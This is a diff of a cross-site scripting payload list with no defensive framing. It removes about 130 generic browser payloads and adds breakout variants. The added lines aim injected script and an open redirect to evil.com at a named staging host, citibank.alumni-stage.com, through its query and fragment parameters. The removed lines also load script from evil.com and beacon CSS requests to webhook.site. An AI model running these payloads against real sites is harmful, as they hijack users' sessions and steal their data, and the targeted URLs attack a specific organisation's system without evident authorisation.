@@ -1,134 +1,22 @@
-<img src=x onerror=alert(1)>
-<img src=x onerror=alert(document.domain)>
-<svg onload=alert(1)>
-<svg/onload=alert(1)>
-<svg onload=alert(1)//
-<body onload=alert(1)>
-<video><source onerror=alert(1)>
-<video src=x onerror=alert(1)>
-<audio src=x onerror=alert(1)>
-<img src=x onerror=alert(1) src=x>
-<img src=x onerror="alert(1)">
-<img src=x onerror='alert(1)'>
-<marquee onstart=alert(1)>x</marquee>
-<marquee loop=1 width=0 onfinish=alert(1)>
-<svg><animate onbegin=alert(1) attributeName=x dur=1s>
-<svg><discard onbegin=alert(1)>
-<svg><set attributeName=onmouseover to=alert(1)>
-<div onmouseover=alert(1)>hover</div>
-<div onpointerover=alert(1)>hover</div>
-<td onfocusin=alert(1) tabindex=1>x</td>
-<input autofocus onfocus=alert(1)>
-<select autofocus onfocus=alert(1)>
-<textarea autofocus onfocus=alert(1)>
-<keygen autofocus onfocus=alert(1)>
-<button autofocus onfocus=alert(1)>x</button>
-<form><input autofocus onfocus=alert(1)></form>
-<p tabindex=1 onfocus=alert(1)>x</p>
-<input autofocus onfocusin=alert(1)>
-<iframe src=javascript:alert(1)>
-<iframe srcdoc="<script>alert(1)</script>">
-<iframe srcdoc="<img src=x onerror=alert(1)>">
-<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
-<iframe srcdoc="&lt;img src=x onerror&#61;alert(1)&gt;">
-<iframe src="data:text/html,<script>alert(1)</script>">
-<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
-<iframe src=//evil.com>
-<a href="javascript:alert(1)">x</a>
-<a href="JaVaScRiPt:alert(1)">x</a>
-<a href="  javascript:alert(1)">x</a>
-<a href="java&#09;script:alert(1)">x</a>
-<a href="java&#x09;script:alert(1)">x</a>
-<a href="&#106;avascript:alert(1)">x</a>
-<a href="&#0000106avascript:alert(1)">x</a>
-<a href="javascript&colon;alert(1)">x</a>
-<a href="javascript&#58;alert(1)">x</a>
-<a href="&#x6a;avascript:alert(1)">x</a>
-<a href="data:text/html,<script>alert(1)</script>">x</a>
-<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>
-<a href="vbscript:msgbox(1)">x</a>
-<form action="javascript:alert(1)"><input type=submit></form>
-<form><button formaction="javascript:alert(1)">x</button></form>
-<form><input type=submit formaction="javascript:alert(1)"></form>
-<isindex action="javascript:alert(1)" type=submit value=x>
-<table background="javascript:alert(1)">
-<object data="javascript:alert(1)">
-<object data="data:text/html,<script>alert(1)</script>">
-<embed src="javascript:alert(1)">
-<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
-<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
-<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
-<base href="javascript:/a/-alert(1)^///">
-<IMG SRC=x ONERROR=alert(1)>
-<ImG sRc=x oNeRrOr=alert(1)>
-<img/src=x/onerror=alert(1)>
-<img src=x onerror=alert(1)//>
-<img src=x onerror=alert(1) <
-<img src=x onerror =alert(1)>
-<img src=x onerror= alert(1)>
-<img src=x onerror=alert(1)onerror=alert(2)>
-<img src=x onerror=alert(1) onerror=alert(2)>
-<img src=x onerror=`alert(1)`>
-<img src=x:x onerror=alert(1)>
-<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
-<img src=x onerror=alert&#40;1&#41;>
-<img src=x onerror=alert&lpar;1&rpar;>
-<img src=x onerror=\u0061lert(1)>
-<a href="javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>">x</a>
-<scrscriptipt>alert(1)</scrscriptipt>
-<img src=x oOnNerrorror=alert(1)>
-<script>alert(1)</script>
-<script >alert(1)</script>
-<script/x>alert(1)</script>
-<script\x00>alert(1)</script>
-<SCRIPT SRC=//evil.com></SCRIPT>
-<script src=data:text/javascript,alert(1)></script>
-<img src="x` <script>alert(1)</script>">
-<svg><script>alert(1)</script></svg>
-<svg><script>alert&#40;1&#41;</script></svg>
-<svg><a xlink:href="javascript:alert(1)"><text x=20 y=20>click</text></a></svg>
-<svg><animate xlink:href=#x attributeName=href values=javascript:alert(1) /><a id=x><text>x</text></a></svg>
-<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>
-<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">
-<math><maction actiontype="statusline#javascript:alert(1)" xlink:href="javascript:alert(1)">click</maction></math>
-<math href="javascript:alert(1)">click</math>
-<math><mi xlink:href="javascript:alert(1)">click</mi></math>
-<svg><image href=x onerror=alert(1)>
-<svg><image href="javascript:alert(1)">
-<object type="text/x-scriptlet" data="http://evil.com/x.html">
-<link rel=stylesheet href=javascript:alert(1)>
-<link rel=import href="data:text/html,<script>alert(1)</script>">
-<frameset onload=alert(1)>
-<applet code="x.class" codebase="javascript:alert(1)">
-<bgsound src=javascript:alert(1)>
-<image src=x onerror=alert(1)>
-<image srcset=x onerror=alert(1)>
-<track src=x onerror=alert(1)>
-<portal src="javascript:alert(1)">
-<x style="behavior:url(#default#time2)" onbegin="alert(1)">
-<noscript><p title="</noscript><img src=x onerror=alert(1)>">
-<noembed><img title="</noembed><img src=x onerror=alert(1)>">
-<xmp><p title="</xmp><img src=x onerror=alert(1)>">
-<listing><p title="</listing><img src=x onerror=alert(1)>">
-<style><img src="</style><img src=x onerror=alert(1)>">
-<textarea><p title="</textarea><img src=x onerror=alert(1)>">
-<title><p title="</title><img src=x onerror=alert(1)>">
-<template><script>alert(1)</script></template>
-<svg></p><style><a id="</style><img src=x onerror=alert(1)>"></svg>
-<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
-<p id="</p><img src=x onerror=alert(1)>">
-<p title="&#34;><img src=x onerror=alert(1)>">
-<p title=""onmouseover=alert(1)="">x</p>
-<h1 style="background:url(https://webhook.site/XXXX/css1)">M</h1>
-<p style="font-family:'</style><script>alert(1)</script>'">x</p>
-<div style="x:expression(alert(1))">x</div>
-<a style="animation-name:x" onanimationstart=alert(1)>x</a>
-<style>@import 'javascript:alert(1)';</style>
-<style>*{background:url(https://webhook.site/XXXX/css2)}</style>
-<p style="background:url(https://webhook.site/XXXX/css3)">x</p>
-{{constructor.constructor('alert(1)')()}}
-{{7*7}}
-<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
-"><svg onload=alert(1)>
-'-alert(1)-'
-javascript:alert(1)
+<!--<img src=x onerror=alert(1)>-->
+<!--><img src=x onerror=alert(1)>-->
+<! --><img src=x onerror=alert(1)>
+<comment><img src=x onerror=alert(1)></comment>
+<![CDATA[<img src=x onerror=alert(1)>]]>
+<p title="</p><img src=x onerror=alert(1)>">
+<h1 title="</h1><img src=x onerror=alert(1)>">M</h1>
+<img src=x alt="`onerror=alert(1)`">
+<img src=x alt="&quot;><img src=x onerror=alert(1)>">
+<p title="&#34;&gt;&lt;img src=x onerror=alert(1)&gt;">
+<p>&lt;img src=x onerror=alert(1)&gt;</p>
+&lt;img src=x onerror=alert(1)&gt;
+<table><tr><td><img src=x onerror=alert(1)></td></tr></table>
+<ul><li><img src=x onerror=alert(1)></li></ul>
+<blockquote><img src=x onerror=alert(1)></blockquote>
+<span data-x="<img src=x onerror=alert(1)>">M</span>
+<script nonce="PASTE_THE_X_NONCE_VALUE">alert(document.domain)</script>
+https://citibank.alumni-stage.com/alumni/anon/policies/v7.2.2-24-policy#<img src=x onerror=alert(1)>
+https://citibank.alumni-stage.com/alumni/anon/policies/v7.2.2-24-policy?redirect=javascript:alert(1)
+https://citibank.alumni-stage.com/alumni/anon/policies/v7.2.2-24-policy?url=//evil.com
+https://citibank.alumni-stage.com/alumni/anon/policies/v7.2.2-24-policy?msg=<img src=x onerror=alert(1)>
+https://citibank.alumni-stage.com/alumni/anon/policies/v7.2.2-24-policy?search=<svg onload=alert(1)>
